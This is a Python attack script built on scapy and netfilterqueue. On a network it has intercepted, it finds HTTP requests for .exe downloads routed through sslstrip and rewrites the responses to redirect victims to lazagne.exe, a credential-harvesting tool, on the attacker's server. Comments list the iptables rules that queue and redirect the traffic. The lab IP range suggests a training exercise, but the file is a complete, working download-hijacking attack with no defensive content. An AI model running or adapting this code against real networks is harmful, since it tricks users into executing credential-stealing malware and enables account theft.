import netfilterqueue
import scapy.all as scapy

ack_list = []
server_ip = "10.0.2.10"


# This method looks for a request to download a .exe and change the response replacing another .exe through the ack
# seq number
def intercept_packet(packet):
    packet_to_intercept = scapy.IP(packet.get_payload())
    if packet_to_intercept.haslayer(scapy.Raw):  # HTTP
        if packet_to_intercept[scapy.TCP].dport == 10000:  # Port where sslstrip is running
            if bytes(".exe", 'utf-8') in packet_to_intercept[scapy.Raw].load and bytes(server_ip, 'utf-8') not in packet_to_intercept[scapy.Raw].load:  #  Req to download .exe
                print("Download request...")
                ack_list.append(packet_to_intercept[scapy.TCP].ack)

        elif packet_to_intercept[scapy.TCP].sport == 10000:  # Its  an HTTP response
            if packet_to_intercept[scapy.TCP].seq in ack_list:  # It is a response for a download req
                ack_list.remove(packet_to_intercept[scapy.TCP].seq)
                print("Changing download file...")
                packet_to_intercept[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://" + server_ip + \
                                                      "/files/lazagne.exe\n\n"
                # Since we edited the packet, we need to recalculate checksum. We deleted it, and scapy will recalculate
                # for us
                del packet_to_intercept[scapy.IP].len
                del packet_to_intercept[scapy.IP].chksum
                del packet_to_intercept[scapy.TCP].chksum
                packet.set_payload(bytes(packet_to_intercept))

    packet.accept()


#  Trap packets in the queue so that we can intercept them and they won't be send
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, intercept_packet)
queue.run()

#  iptables -I OUTPUT -j NFQUEUE --queue-num 0
#  iptables -I INPUT -j NFQUEUE --queue-num 0
#  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
